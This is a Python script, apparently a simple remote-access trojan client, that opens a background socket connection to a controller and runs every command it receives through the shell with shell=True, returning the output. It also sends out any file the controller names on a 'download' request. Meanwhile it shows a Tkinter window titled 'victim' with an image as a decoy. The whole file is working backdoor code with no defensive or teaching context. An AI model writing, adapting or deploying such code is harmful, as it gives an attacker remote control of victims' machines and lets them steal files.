import socket
import threading
import tkinter as tk
import subprocess
import os
import time


HOST=socket.gethostbyname(socket.gethostname())
PORT=12345
client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)



def run_command(command:str):
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        
        if result.returncode == 0:
            return result.stdout.strip()  
        else:
            return f"Error executing command: {result.stderr.strip()}"
    except subprocess.CalledProcessError as e:
        return f"Error executing command: {e.stderr.strip()}"



def downloading_a_file(_request:str):
    words=_request.split()
    print(words[1])
    file=open(words[1],"rb")
   # length=len('client_'+words[1])
    print('client_'+words[1])
    name='client_'+words[1]
    #client.send(str(length).encode())
    client.send(name.encode())
    time.sleep(1)
    data=file.read()
    client.sendall(data)
    print("data sent")
    client.send(b"<END>")
    print("the code sent")
    file.close()




def background():
    client.connect((HOST,PORT))
    print("connectd sucssefully!!")
    while True:
        request=client.recv(1024).decode('UTF-8')
        print(request)
        if 'download' in request:
            downloading_a_file(request)
        else:
            output=run_command(request)
            client.sendall(output.encode('UTF-8'))

        

def front():
    root=tk.Tk()
    root.title("victim")
    root.geometry("1000x450")
    photo=tk.PhotoImage(file="photo.png")
    label=tk.Label(root,image=photo,width=1000,height=450,bg="black",fg="yellow")
    label.pack()
    root.mainloop()



def start():
    background_thread=threading.Thread(target=background)
    background_thread.start()
    front_thread=threading.Thread(target=front)
    front_thread.start()
    


start()